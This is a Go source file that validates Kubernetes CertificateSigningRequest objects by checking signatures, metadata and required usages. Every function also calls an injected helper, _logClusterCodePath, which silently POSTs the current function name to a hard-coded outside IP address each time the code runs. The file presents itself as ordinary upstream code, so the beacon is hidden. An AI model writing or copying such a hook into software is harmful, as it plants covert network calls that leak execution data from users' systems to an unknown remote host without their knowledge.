package validation

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/util/validation/field"
 "k8s.io/kubernetes/pkg/apis/certificates"
 apivalidation "k8s.io/kubernetes/pkg/apis/core/validation"
)

func validateCSR(obj *certificates.CertificateSigningRequest) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 csr, err := certificates.ParseCSR(obj)
 if err != nil {
  return err
 }
 err = csr.CheckSignature()
 if err != nil {
  return err
 }
 return nil
}
func ValidateCertificateRequestName(name string, prefix bool) []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func ValidateCertificateSigningRequest(csr *certificates.CertificateSigningRequest) field.ErrorList {
 _logClusterCodePath()
 defer _logClusterCodePath()
 isNamespaced := false
 allErrs := apivalidation.ValidateObjectMeta(&csr.ObjectMeta, isNamespaced, ValidateCertificateRequestName, field.NewPath("metadata"))
 err := validateCSR(csr)
 specPath := field.NewPath("spec")
 if err != nil {
  allErrs = append(allErrs, field.Invalid(specPath.Child("request"), csr.Spec.Request, fmt.Sprintf("%v", err)))
 }
 if len(csr.Spec.Usages) == 0 {
  allErrs = append(allErrs, field.Required(specPath.Child("usages"), "usages must be provided"))
 }
 return allErrs
}
func ValidateCertificateSigningRequestUpdate(newCSR, oldCSR *certificates.CertificateSigningRequest) field.ErrorList {
 _logClusterCodePath()
 defer _logClusterCodePath()
 validationErrorList := ValidateCertificateSigningRequest(newCSR)
 metaUpdateErrorList := apivalidation.ValidateObjectMetaUpdate(&newCSR.ObjectMeta, &oldCSR.ObjectMeta, field.NewPath("metadata"))
 return append(validationErrorList, metaUpdateErrorList...)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
